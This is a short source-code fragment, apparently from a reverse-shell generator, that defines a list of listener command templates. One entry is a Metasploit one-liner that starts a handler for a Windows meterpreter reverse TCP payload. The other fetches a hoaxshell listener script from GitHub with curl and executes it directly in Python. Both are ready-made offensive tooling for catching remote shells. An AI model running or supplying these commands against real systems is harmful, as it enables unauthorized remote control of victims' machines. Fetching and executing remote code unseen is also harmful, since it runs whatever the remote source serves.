...
export const LISTENER_COMMANDS = [
    ...
    {
        key: 'msfconsole',
        value: 'msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost {ip}; set lport {port}; exploit"'
    },
    {
        key: 'hoaxshell',
        value: 'python3 -c "$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)" -t {type} -p {port}'
    }
]
